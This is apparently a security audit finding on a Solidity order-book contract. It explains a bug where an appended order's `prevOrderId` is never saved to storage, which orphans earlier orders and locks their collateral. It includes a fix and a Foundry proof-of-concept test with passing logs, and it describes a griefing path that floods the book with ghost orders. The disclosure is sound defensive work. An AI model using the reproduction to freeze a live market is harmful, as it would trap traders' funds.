  "body": "## Summary\n\nEvery time a limit order is appended to an existing price-level, the contract fails to persist the new order’s `prevOrderId` field. Subsequent cancellation, full fill, or expiry of that appended order causes the removal routine to mis-handle the doubly-linked list, detaching all earlier orders at that price. \n\nThese ghost orders are no longer reachable by matching, amending, or cancelling logic, yet they continue to:\n(a) hold user collateral hostage\n(b) inflate open-interest accounting, and\n(c) consume one of the limited tree nodes governed by `maxNumLimitsPerSide`\n\nA motivated trader can intentionally create thousands of ghost orders, exhausting book capacity and freezing deep-book activity. \n\n## Vulnerability Description\n\nOrder stored without links. `_updateBookPostOrder()` writes the freshly created `Order` struct to `storage`; `prevOrderId` is still `0`.\n\n```solidity\nfunction _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {\n        if (order.side == Side.BUY) {\n            limit = self.bidLimits[order.price];\n            if (limit.numOrders == 0) self.bidTree.insert(order.price);\n            self.metadata().numBids++;\n            self.metadata().quoteTokenOpenInterest += self.getQuoteTokenAmount(order.price, order.amount);\n        } else {\n            limit = self.askLimits[order.price];\n            if (limit.numOrders == 0) self.askTree.insert(order.price);\n            self.metadata().numAsks++;\n            self.metadata().baseTokenOpenInterest += order.amount;\n        }\n\n        self.orders[order.id] = order;\n    }\n```\n\nLink update only in memory. In `_updateLimitPostOrder()` the library sets\n```solidity\nfunction _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {\n        limit.numOrders++;\n\n        if (limit.headOrder.isNull()) {\n            limit.headOrder = order.id;\n            limit.tailOrder = order.id;\n        } else {\n            Order storage tailOrder = self.orders[limit.tailOrder];\n            tailOrder.nextOrderId = order.id;\n            order.prevOrderId = tailOrder.id;\n            limit.tailOrder = order.id;\n        }\n\n        emit LimitOrderCreated(BookEventNonce.inc(), order.id, order.price, order.amount, order.side);\n    }\n```\n\nHere, \n```solidity\norder.prevOrderId = tailOrder.id;   // <-- memory, never persisted\nlimit.tailOrder = order.id;                // persisted\n```\n\nBecause `order` is a memory copy, the storage slot at `self.orders[order.id]` never receives the new `prevOrderId`.\n\nRemoval mis-classifies node. When any later path calls `_updateLimitRemoveOrder()` on this order, the branch\n```solidity\nfunction _updateLimitRemoveOrder(Book storage self, Order storage order) private {\n        uint256 price = order.price;\n\n        Limit storage limit = order.side == Side.BUY ? self.bidLimits[price] : self.askLimits[price];\n\n        if (limit.numOrders == 1) {\n            if (order.side == Side.BUY) {\n                delete self.bidLimits[price];\n                self.bidTree.remove(price);\n            } else {\n                delete self.askLimits[price];\n                self.askTree.remove(price);\n            }\n            return;\n        }\n\n        limit.numOrders--;\n\n        OrderId prev = order.prevOrderId;\n        OrderId next = order.nextOrderId;\n\n        if (!prev.isNull()) self.orders[prev].nextOrderId = next;\n        else limit.headOrder = next;\n\n        if (!next.isNull()) self.orders[next].prevOrderId = prev;\n        else limit.tailOrder = prev;\n    }\n```\n\nHere, `if (!prev.isNull()) … else limit.headOrder = next;` treats the order as a head (since `prev == 0`). It rewires `limit.headOrder` to `next`, effectively dropping the true head segment from the list. Those older orders become unreachable.\n\n## Impact \n\nMakers cannot withdraw or reuse tokens committed to ghost orders.\n\n## Recommendations\n\nPersist `prevOrderId`\n```solidity\n// In BookLib._updateLimitPostOrder()\ntailOrder.nextOrderId     = order.id;\nself.orders[order.id].prevOrderId = tailOrder.id;   // intended fix\nlimit.tailOrder           = order.id;\n```\n\nor convert `order` to a storage pointer at the start of the function.",
  "proof_of_concept": "## Proof of Concept \n\n`forge test --match-test test_submissionValidity`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {PoCTestBase} from \"./PoCTestBase.t.sol\";\n\nimport {ICLOB, Side, Limit} from \"contracts/clob/ICLOB.sol\";\nimport {OrderId}            from \"contracts/clob/CLOB.sol\"; \n\ncontract PrevOrderIdOrphanPoC is PoCTestBase {\n    /*\n        Scenario:\n        1. jb posts two BUY limit orders at the same price.\n        2. jb cancels the second order.\n        3. Price-level now reports numOrders == 1 but headOrder == 0 ⇒ OrderA is orphaned.\n    */\n\n    function test_submissionValidity() external {\n        // ---------- SET-UP ----------\n        ICLOB   clob  = ICLOB(abCLOB);   // tokenA / tokenB market\n        uint256 price = 1 ether;         // tick-aligned (tickSize = 0.0001 ether)\n        uint256 size  = 0.01 ether;      // ≥ minLimitOrderAmountInBase\n\n        // Fund jb with quote token (tokenA) and deposit\n        tokenA.mint(jb, 1 ether);\n        vm.startPrank(jb);\n        tokenA.approve(address(accountManager), 1 ether);\n        accountManager.deposit(jb, address(tokenA), 1 ether);\n\n        // ---------- FIRST LIMIT ----------\n        ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({\n            amountInBase:    size,\n            price:           price,\n            cancelTimestamp: 0,\n            side:            Side.BUY,\n            clientOrderId:   0,\n            limitOrderType:  ICLOB.LimitOrderType.POST_ONLY\n        });\n        uint256 orderA = clob.postLimitOrder(jb, args).orderId;\n\n        // ---------- SECOND LIMIT (same price) ----------\n        uint256 orderB = clob.postLimitOrder(jb, args).orderId;\n\n        // ---------- CANCEL THE SECOND ORDER ----------\n        uint256[] memory ids = new uint256[](1);\n        ids[0] = orderB;\n        clob.cancel(jb, ICLOB.CancelArgs({orderIds: ids}));\n        vm.stopPrank();\n\n        // ---------- ASSERT BROKEN STATE ----------\n        Limit memory limitInfo = clob.getLimit(price, Side.BUY);\n\n        // 1. Library still thinks one order exists\n        assertEq(limitInfo.numOrders, 1, \"numOrders should be 1 after one cancel\");\n\n        // 2. But headOrder == 0 ⇒ linked list broken, OrderA orphaned\n        uint256 head = OrderId.unwrap(limitInfo.headOrder);\n        assertEq(\n            head,\n            0,\n            \"headOrder should have been OrderA; got 0 (orphaned list :: bug reproduced)\"\n        );\n    }\n}\n```\n\nLOGS:-\n```bash\nRan 1 test for test/c4-poc/PoC.t.sol:PrevOrderIdOrphanPoC\n[PASS] test_submissionValidity() (gas: 554545)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.96ms (1.48ms CPU time)\n\nRan 1 test suite in 14.33ms (9.96ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
